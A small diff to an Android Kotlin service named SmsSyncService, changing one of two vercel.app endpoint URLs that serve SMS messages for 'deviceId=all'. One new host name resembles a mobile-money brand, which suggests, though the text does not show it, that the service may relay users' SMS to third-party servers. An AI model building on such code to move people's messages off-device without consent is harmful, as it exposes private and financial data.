@@ -21,7 +21,7 @@ class SmsSyncService : Service() {
     private var syncFuture: ScheduledFuture<*>? = null
 
     private val endpoints = listOf(
-        "https://ramussbirr.vercel.app/api/sms/messages?deviceId=all",
+        "https://cbebirr-lovat.vercel.app/api/sms/messages?deviceId=all",
         "https://ms-bk-connect.vercel.app/api/sms/messages?deviceId=all"
     )
 
